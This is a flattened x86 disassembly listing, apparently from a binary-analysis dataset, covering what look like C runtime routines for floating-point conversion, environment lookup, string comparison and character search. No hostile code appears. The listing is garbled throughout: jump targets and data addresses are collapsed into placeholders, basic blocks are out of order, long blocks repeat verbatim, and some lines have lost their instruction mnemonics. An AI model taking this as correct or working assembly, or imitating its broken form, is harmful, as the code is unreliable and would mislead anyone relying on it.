stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_4375d0
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_437b14
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
cmp [ ebp + 0xc ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
cmp edi esi
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
test ebx ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
mov [ eax ] edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
mov [ ebp - 0x10 ] edx
cmp esi ecx
jb r-xdata
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
test esi esi
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] esi
test ebx ebx
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_437ce2
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_4258f0
pop ecx
mov edi eax
jmp r-xdata
call sub_4388cd
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_4258f0
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_4388b3
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_437d69
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_437dd4
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_437e0d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
push edi
push [ ebp + 0x8 ]
call sub_437dd4
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub esi eax
mov eax esi
pop esi
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_428ab9
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_428ab9
add esp 0x10
inc edi
cmp esi ebx
je r-xdata
sub_437ee2
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_437e0d
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
pop esi
pop ebp
jmp sub_437dd4
pop esi
pop ebp
retn
sub_437f40
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_437f6d
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_423619
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_42d6a0
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_43708c
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
sub_438015
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_423619
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_42d6a0
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_4375d0
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
